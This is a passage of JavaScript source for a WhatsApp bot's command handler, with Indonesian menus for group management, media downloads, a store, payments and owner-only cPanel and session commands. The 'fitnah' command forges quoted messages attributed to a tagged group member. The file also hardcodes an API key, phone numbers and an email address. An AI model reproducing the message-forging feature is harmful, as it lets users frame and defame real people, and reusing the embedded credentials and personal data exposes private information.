break
case 'gcmenu':{
return reply(`々 *Menu Group*

> ${prefix}fitnah
> ${prefix}del
> ${prefix}revoke
> ${prefix}tagall
> ${prefix}hidetag
> ${prefix}setdesc
> ${prefix}lgc
> ${prefix}infogc
> ${prefix}setppgrup
> ${prefix}setnamegrup
> ${prefix}group open/close
> ${prefix}antilink on/off
> ${prefix}welcome on/off
> ${prefix}tiktokauto on/off
> ${prefix}kick @tag
> ${prefix}demote @tag
> ${prefix}promote @tag`)
}
break
case 'cvmenu':{
return reply(`々 *Menu Convert*

> ${prefix}tourl
> ${prefix}tinyurl
> ${prefix}toimg
> ${prefix}tomp3
> ${prefix}toaudio
> ${prefix}tomp4
> ${prefix}tovideo
> ${prefix}sgif
> ${prefix}swm
> ${prefix}sticker
> ${prefix}smeme
> ${prefix}takesticker`)
}
break
case 'dlmenu':{
return reply(`々 *Menu Download*

> ${prefix}tiktok
> ${prefix}ytmp3
> ${prefix}ytmp4
> ${prefix}play
> ${prefix}pin
> ${prefix}gitclone
> ${prefix}mediafire
> ${prefix}wikimedia`)
}
break
case 'usrmenu':{
return reply(`々 *Menu User*

> ${prefix}ai
> ${prefix}report
> ${prefix}request`)
}
break
case 'imgmenu':{
return reply(`々 *Image Maker*

> ${prefix}joker
> ${prefix}digital
> ${prefix}nulis
> ${prefix}nulis2
> ${prefix}quoteser
> ${prefix}quobucin`)
}
break
case 'storemenu':{
return reply(`々 *Menu Store*

> ${prefix}kali 1 2
> ${prefix}bagi 1 2
> ${prefix}kurang 1 2
> ${prefix}tambah 1 2
> ${prefix}dellist [key@response]
> ${prefix}addlist [key@response]
> ${prefix}done [reply pesanan]
> ${prefix}proses [reply pesanan]
> ${prefix}list `)
}
break
case 'linkwa':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply('Judul?')
nyx.linkwa(q)
.then(result => {
let list = `*- [ LINK GC WA ] -*`
for (let i of result) {
list += `\nNama: ${i.nama}\nLink: ${i.link}\n\n`
}
reply(list)})
}
break
case 'sfile':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply('Judul?')
nyx.sfilesearch(q)
.then(result => {
let list = '*- [ SFILE MOBI ] -*'
for (let i of result) {
list += `\nNama: ${i.name}\nLink: ${i.link}\n\n`
}
reply(list)})
}
break
case 'bc':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} hallo`)
let db_user = JSON.parse(fs.readFileSync('./database/pengguna.json'));
let data_teks = `${q}`
for (let i of db_user){ 
var button_broadcast = {text: data_teks, footer: 'Ryuu Zxy` || Deathers Team', buttons: [{ buttonId: '!menu', buttonText: {displayText: '⋮☰ 𝗠𝗘𝗡𝗨'}, type: 1}],headerType: 1}
conn.sendMessage(i.id, button_broadcast)
sleep(2000)
}
reply(`*Sukses mengirim broadcast text ke ${db_user.length} user*`)
}
break
case 'happymod':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply('Judul?')
nyx.happymod(q)
.then(result => {
let list = '*- [ HAPPY MOD ] -*'
for (let i of result) {
list += `\nNama: ${i.name}\nLink: ${i.link}\n\n`
}
reply(list)})
}
break
case 'restart':
if (!isOwner) return reply(`Akses di tolak`)
reply(`Restarting...`)
exec(`pm2 restart all`)
sleep(4000)
reply('Sukses')
break
case 'scnqris':
case 'pay':{
let tekssss = `───「 *PAYMENT* 」────

Dana: ${global.numberDana}

*Untuk Pembayaran Silahkan Scan Qris Yang Tertera Pada Gambar Diatas.*
*Note: Untuk Menghindari Drama Sertakan Bukti Transfer Untuk Menjaga Ketentraman Bersama*
`
conn.sendMessage(from, { image: fs.readFileSync(`./qris.jpg`), caption: tekssss, footer: `${global.ownerName} || Deathers Team`,}, { quoted: ftextt })
}
break
case 'infoowner':
case 'ownerinfo':{
return reply(`──「 *INFO OWNER* 」──

 *Data Profil*
 • *Nama:* ${global.ownerName}
 • *Umur:* ${global.umur}
 • *Hoby:* ${global.hoby}
 • *Askot:* ${global.askot}
 • *Konten:* ${global.konten}

_iam developer bot whatsapp._

 *Sosial Media*
 • *Whatsapp:* ${global.ChatOwner}`)
}
break
case 'joker':
case 'digital':
case 'nulis':
case 'nulis2':
case 'quoteser':
case 'quobucin':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Contoh:\n${prefix+command} saya bukan wibu`)
var buc = `https://saipulanuar.ga/api/textmaker/${command}?text=${q}&apikey=jPHjZpQF`
conn.sendMessage(from, { image:{url:buc}, caption:'Done!'}, {quoted: ftextt})
}
break
case 'tinyurl':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply('link yang mau di short mna?')
try {
var link = args[0]
var anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`*- [ SHORT LINK] -*\n\n> *Link Data:*\n${anu.data}`)
} catch (e) {
reply(`${e}`)
}
}
break
case 'pin':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Contoh:\n${prefix+command} loli`)
fetchJson(`https://saipulanuar.ga/api/search/pinterest?query=${q}&apikey=jPHjZpQF`)
.then(pin =>{
var media = pickRandom(pin.result)
conn.sendMessage(from, { image:{url:media}, caption:`Done\nQuery: *${q}*`}, {quoted:ftextt})
})
}
break
case 'tts':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Contoh:\n${prefix+command} hallo bro`)
var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`
conn.sendMessage(from, {audio:{url:tts}, mimetype:'audio/mpeg', ptt:true}, {quoted:ftextt})
}
break
case 'play': case 'ytplay': {
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(q)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
reply('Tunggu sebentar...')
let buttons = [
{buttonId: `.ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `.ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
○ Title : ${anu.title}
○ Ext : Search
○ ID : ${anu.videoId}
○ Duration : ${anu.timestamp}
○ Viewers : ${anu.views}
○ Upload At : ${anu.ago}
○ Author : ${anu.author.name}
○ Channel : ${anu.author.url}
○ Description : ${anu.description}
○ Url : ${anu.url}`,
footer: `${global.botName} || Deathers Team`,
buttons: buttons,
headerType: 4
}
conn.sendMessage(from, buttonMessage, { quoted: ftextt })
}
break
case 'mediafire':{
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply('*Contoh:*\n#mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file')
let isLinks = q.match(/(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply('Link yang kamu berikan tidak valid')
reply('*Mengunduh Media...*')
let baby1 = await mediafireDl(`${isLinks}`)
let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Type* : ${baby1[0].mime}

_Wait Mengirim file..._
`
reply(result4)
conn.sendMessage(from, {document:{url:baby1[0].link}, fileName:baby1[0].nama, mimetype: baby1[0].mime}, {quoted:ftextt}).catch ((err) => reply('Gagal saat mendownload File'))
}
break
case 'speed':
case 'ping':{
const reactionMessage = { react: { text: "✨", key: msg.key}}
conn.sendMessage(from, reactionMessage)
const timestamp = speed();
const latensi = speed() - timestamp
exec(`neofetch --stdout`, (error, stdout, stderr) => {
var child = stdout.toString('utf-8')
var teks = child.replace(/Memory:/, "Ram:")
var pingnya = `${teks}Speed: ${latensi.toFixed(4)} Second`
conn.sendMessage(from, { text: pingnya }, { quoted: ftextt })
})
}
break
case 'infobot':
reply(`𝗕𝗢𝗧 𝗜𝗡𝗙𝗢

• Author : @${ownerNumber}
• Owner : ${global.ownerName}
• Botname : ${global.botName}
• Library : Baileys-MD
• Time : ${jam} WIB
• Date : ${tanggal}
• Room Chat : ( ${db_menfes.length} )`)
break
case 'runtime':
case 'tes':{
if (!isOwner) return reply(mess.OnlyOwner)
const reactionMessage = { react: { text: "🐉", key: msg.key}}
conn.sendMessage(from, reactionMessage)
reply(`*Runtime :* ${runtime(process.uptime())}`)}
break
case 'rules':{
return reply(`*──「 RULES-BOT 」──*

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

Jika sudah paham rulesnya
Ketik *.menu* untuk memulai bot `)
}
break
case 'owner':{
var nomorRyuu = '6285298256587'
var nomorDeska = '62895630786584'
var nomorRival = '628990951073'
sendContact(from, nomorRyuu, 'Ryuu Zxy`', msg)
sleep (3000)
sendContact(from, nomorDeska, 'Deathers YT', msg)
sleep (3000)
sendContact(from, nomorRival, 'Rival', msg)
}
break
case 'sewabot':{
const reactionMessage = { react: { text: "✨", key: msg.key}}
conn.sendMessage(from, reactionMessage)
mentions(`*SEWA BOT*

*List Harga*
Permanen Rp 10.000

*day › hari/2k*

*Keuntungan Sewabot*
- _Bisa Add Bot 1 Group_
- _Bisa Gunain Fitur Admin_

*Minat Sewabot?*
*Hubungi Owner*
wa.me/6281227374317`)}
break
case "getcase": {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply("Mau ngambil case apa?")
try {
reply(getCase(q))
} catch {
reply("Case Tidak Ditemukan")
}
}
break
case 'resetlist':
db_respon_list.splice('[]')
fs.writeFileSync('./database/db_ListMessage', JSON.stringify(db_respon_list, null, 1))
reply('Sukses Reset List Message')
break
// OWNER ONLY
case 'setexif':
case 'setwm':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#setwm pack|author')
let nama_Pack = q.split('|')[0]
let author_Pack = q.split('|')[1]
if (!nama_Pack) return reply('*Contoh:*\n#setwm pack|author')
if (!author_Pack) return reply('*Contoh:*\n#setwm pack|author')
exif.create(nama_Pack, author_Pack)
reply('Sukses membuat exif')
}
break
case 'sc': case 'script':{
const reactionMessage = { react: { text: "✨", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let text_buysc =`*_Mau beli scriptnya? harga murah kok._*

*Contact Person 📞*

*Admin:*
*Wa.me/6281227374317*

_*Harga:*_ ~Rp10.000~

_Script Sudah Disusun Rapih_
_Size Script Sudah Ringan_
_Anti Ngelag - Anti Delay_
_Anti Spam - Anti Call_
_Fitur Store_
_Total Fitur 100++_`
conn.sendMessage(from, { text: text_buysc }, { quoted: ftextt })
}
break
case 'request': {
const reactionMessage = { react: { text: "🐦", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Req fitur antilink bg`)
var teks = `*| REQUEST FITUR |*`
var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var teks2 = `\n\nSucces send to owner`
conn.sendMessage("6285298256587@s.whatsapp.net", {text: teks + teks1, mentions:[sender]}, {quoted:ftextt})
conn.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted:ftextt})
}
break
case 'ytmp3': case 'ytaudio': {
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
try {
let quality = '128kbps'
let media = await yta(q, quality)
conn.sendMessage(from, { image: { url: media.thumb }, caption: `○ Title : ${media.title}\n○ File Size : ${media.filesizeF}\n○ Url : ${isUrl(q)}\n○ Ext : MP3\n○ Resolusi : 128kbps`}, { quoted: ftextt })
conn.sendMessage(from, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: ftextt })
} catch {
reply('Error!\nMungkin file size melebihi batas...')
}}
break
case 'ytmp4': case 'ytvideo': {
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
try {
let quality = '360p'
let media = await ytv(q, quality)
conn.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `○ Title : ${media.title}\n○ File Size : ${media.filesizeF}\n○ Url : ${isUrl(q)}\n○ Ext : MP3\n○ Resolusi : 360p` }, { quoted: ftextt })
} catch {
reply('Error!\nMungkin file size melebihi batas...')
}}
break
case 'report': {
const reactionMessage = { react: { text: "🐦", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n${prefix+command} Fitur anu error bang`)
var teks = `*| REPORT FITUR |*`
var teks1 = `\n\nNomor : @${sender.split("@")[0]}\nPesan : ${q}`
var teks2 = `\n\nSucces send to owner`
conn.sendMessage("6285298256587@s.whatsapp.net", {text: teks + teks1, mentions:[sender]}, {quoted:ftextt})
conn.sendMessage(from, {text: teks + teks2 + teks1, mentions:[sender]}, {quoted:ftextt})
}
break
case 'createcp':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`*CREATECP ACCOUNT*\nExample:\n#${command} domain|package\n\nContoh:\n#${command} sanzzyapi.com|sanzz`)
let usern = `USER ${makeid(6)}`
let domain = q.split('|')[0] 
let pekeg = q.split('|')[1]
if (!domain) return reply('Domain wajib di isi!!')
if (!pekeg) return reply('Package Wajib di isi!!')
reply('Creating please wait... ⏳')
axios.get(`https://${global.hostwhm}:2087/json-api/createacct?api.version=1&username=${usern}&contactemail=4ksanzz@gmail.com&plan=${pekeg}&domain=${domain}`, authWhm)
.then(response => { 
let np = response.data
if (np.metadata.result == 0) {
reply(np.metadata.reason)
} else {
let dsta = np.metadata.output.raw;
var substr = dsta.substring(
dsta.toString().indexOf("+===================================+")
); //substr = 'word. Hello!'
let xxybot = substr.split("| Language: en")[0];
reply(`${xxybot}\n\nLogin : https://${global.hostwhm}:2087`)
}});
break
case 'listcp':
if (!isOwner) return reply(mess.OnlyOwner)
reply('Wait Getting List Account info....')
axios.get(`https://${global.hostwhm}:2087/json-api/listaccts?api.version=1`, authWhm)
.then((risol) => {
let lisol = risol.data
var ttdy = lisol.data.acct
let ogh = `*── 「 LIST CPANEL 」 ──*\nTotal Akun : ${ttdy.length}\n`
for (let i = 0; i < ttdy.length; i++) {
ogh += `
\n
─────[\`\`\` ${ttdy[i].user} \`\`\` ]────────
*▢ Maxsub* : ${ttdy[i].maxsub}
*▢ Maxsql* : ${ttdy[i].maxsql}
*▢ Startdate* : ${ttdy[i].startdate}
*▢ Disklimit* : ${ttdy[i].disklimit}
*▢ Maxlst* : ${ttdy[i].maxlst}
*▢ Plan* : ${ttdy[i].plan}
*▢ Owner*: ${ttdy[i].owner}
*▢ IP* : ${ttdy[i].ip}
*▢ Domain* : ${ttdy[i].domain}
*▢ Diskused* : ${ttdy[i].diskused}
*▢ Maxaddons* : ${ttdy[i].maxaddons}
*▢ Suspendreason* : ${ttdy[i].suspendreason}
─────────────────\n\n`
}
reply(ogh)
})
break
case 'terminate':
if (!isOwner) return reply(mess.OnlyOwner)
if (args.length < 2) return reply(`Kirim perintah #${command} username`)
reply('Wait Terminating Account....')
axios
.get(
`https://${global.hostwhm}:2087/json-api/removeacct?api.version=1&username=${args[1]}`, authWhm )
.then((e) => {
if ([1, "1"].includes(e.data?.metadata?.result))
reply(`Done User ${q} Telah di Terminate`);
else {
reply(e.metadata);
console.log(e.data);
}
})
break
case 'myuser': case 'senddata': case 'datauser':{
if (!isOwner) return reply(mess.OnlyOwner)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
reply('please wait..')
sleep(3000)

// Read Database
var user_bot = await fs.readFileSync('./database/pengguna.json')
// var sesi_bot = await fs.readFileSync(`./session.json`)

// Sending Document
// conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted:ftextt})
conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted:ftextt})
}
break
case 'mysesi': case 'sendsesi': case 'session':{
if (!isOwner) return reply(mess.OnlyOwner)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
reply('please wait..')
sleep(3000)

// Read Database
// var user_bot = await fs.readFileSync('./database/pengguna.json')
var sesi_bot = await fs.readFileSync(`./session.json`)

// Sending Document
conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json'}, {quoted:ftextt})
// conn.sendMessage(from, { document: user_bot, mimetype: 'document/application', fileName: 'pengguna.json'}, {quoted:ftextt})
}
break
// CASE BY MELL 
case 'clear':
case 'clearer':
case 'clearerr':{
if (!isOwner) return reply(mess.OnlyOwner)
const reactionMessage = { react: { text: "🐉", key: msg.key}}
conn.sendMessage(from, reactionMessage)
server_eror.splice('[]')
fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
reply('Done')
}
break
case 'error':{
if (!isOwner) return reply(mess.OnlyOwner)
const reactionMessage = { react: { text: "🐉", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var teks =`*ERROR SERVER*\n_Total Tercatatat_ : ${server_eror.length}\n\n`
var NO = 1
for (let i of server_eror){
teks +=`=> *ERROR ( ${NO++} )*\n${i.error}\n\n`
}
reply(teks)
}
break

// STORE FUN
case 'shop': case 'list':
if (!isGroup) return reply(mess.OnlyGrup)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
var listMsg = {
text: `Hi @${sender.split("@")[0]}`,
buttonText: 'Click Here!',
footer: `*List From ${groupName}*\n\n⏳ ${jam}\n📆 ${tanggal}`,
mentions: [sender],
sections: [{
title: groupName, rows: arr_rows
}]
}
conn.sendMessage(from, listMsg)
break
case 'addlist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil menambah List menu : *${args1}*`)
break

case 'dellist':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'update':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Berhasil update List menu : *${args1}*`)
break
case 'tambah':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one + nilai_two}`)
break
case 'kurang':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one - nilai_two}`)
break
case 'kali':
if (!q) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one * nilai_two}`)
break
case 'bagi':
if (!q) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
var num_one = q.split(' ')[0]
var num_two = q.split(' ')[1]
if (!num_one) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
if (!num_two) return reply(`Gunakan dengan cara ${prefix+command} *angka* *angka*\n\n_Contoh_\n\n${prefix+command} 1 2`)
var nilai_one = Number(num_one)
var nilai_two = Number(num_two)
reply(`${nilai_one / nilai_two}`)
break
case 'p': case 'proses':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM : ${jam}\n✨ STATUS: Pending\`\`\`\n\n📝 Catatan : ${quotedMsg.chats}\n\nPesanan @@${sender.split("@")[0]} sedang di proses!`, [sender])
}
break
case 'd': case 'done':{
if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
if (!quotedMsg) return reply('Reply pesanannya!')
mentions(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM : ${jam}\n✨ STATUS: Berhasil\`\`\`\n\nTerimakasih @@${sender.split("@")[0]} Next Order ya🙏`, [sender])
}
break
case 'setppbot':
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#setppbot* atau reply gambar yang sudah dikirim dengan pesan *#setppbot*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./${sender.split('@')[0]}.jpg`)
var media = `./${sender.split('@')[0]}.jpg`
conn.updateProfilePicture(botNumber, { url: media })
reply('Sukses Mengganti Profile Bot')
sleep(2000)
fs.unlinkSync(media)
break
case 'fitnah':
if (!isGroup) return reply(mess.OnlyGrup)
if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
var org = q.split("|")[0]
var target = q.split("|")[1]
var bot = q.split("|")[2]
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
break
case 'del':
case 'delete':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!quotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
break
case 'linkgrup': case 'linkgc': case 'lgc':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
reply(url)}
break
case 'kick':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var number;
if (mentionUser.length !== 0) {
number = mentionUser[0]
conn.groupParticipantsUpdate(from, [number], "remove")
} else if (isQuotedMsg) {
number = quotedMsg.sender
conn.groupParticipantsUpdate(from, [number], "remove")
} else {
reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
}}
break
case 'setppgrup': case 'setppgc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./${sender.split('@')[0]}.jpg`)
var media = `./transaksi/${sender.split('@')[0]}.jpg`
await conn.updateProfilePicture(from, { url: media })
sleep(2000)
reply('Sukses mengganti foto profile group')
sleep(3000)
fs.unlinkSync(media)
break
case 'setnamegrup': case 'setnamegc':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} teks`)
await conn.groupUpdateSubject(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'setdesc': case 'setdescription':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah ${command} teks`)
await conn.groupUpdateDescription(from, q)
.then( res => {
reply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'group': case 'grup':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
if (args[0] == "close") {
conn.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
conn.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
}
break
case 'revoke':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
await conn.groupRevokeInvite(from)
.then( res => {
reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'tagall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Teks?`)
let teks_tagall = `> ${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `> @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: ftextt })
break
case 'hidetag':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isOwner) return reply(mess.OnlyOwner)
let mem = [];
groupMembers.map( i => mem.push(i.id) )
conn.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'welcome':{
if (!isGroup) return reply('Khusus Group!') 
if (!msg.key.fromMe && !isOwner && !isGroupAdmins) return reply("Khusus admin!")
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isWelcome) return reply('Sudah aktif✓')
welcomeJson.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Suksess mengaktifkan welcome di group:\n'+groupName)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
welcomeJson.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Success menonaktifkan welcome di group:\n'+groupName)
